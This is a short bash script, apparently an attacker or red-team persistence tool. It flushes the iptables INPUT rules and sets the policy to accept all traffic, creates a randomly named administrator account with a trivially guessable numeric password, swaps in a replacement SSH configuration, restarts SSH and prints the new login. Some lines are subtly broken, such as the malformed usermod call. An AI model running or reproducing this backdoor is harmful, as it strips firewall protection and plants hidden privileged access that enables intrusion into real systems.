#!/bin/bash
echo 'Flushing iptables'
sudo iptables -F INPUT;
sudo iptables -P INPUT ACCEPT;
echo Adding new admin account...;
random_number=$(((RANDOM %10)+1));
random_user=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1);
sudo useradd $random_user;
echo $random_user:$random_number | sudo chpasswd;
if [ -f /usr/bin/yum ]; then sudo usermod -aG wheel  . $random_user . ; fi;
if [ -f /usr/bin/apt ]; then sudo useradd $random_user; fi;
echo Configuring SSH...;
sudo cp sshd_config /etc/ssh/sshd_config;
sudo cp sshd_banner /etc/ssh/sshd_banner;
if [ -f /usr/bin/yum ]; then sudo service sshd restart; fi;
if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi;
arr4y="Added admin:, $random_user, password:, $random_number, SSH Litening on port 22";
echo $arr4y;
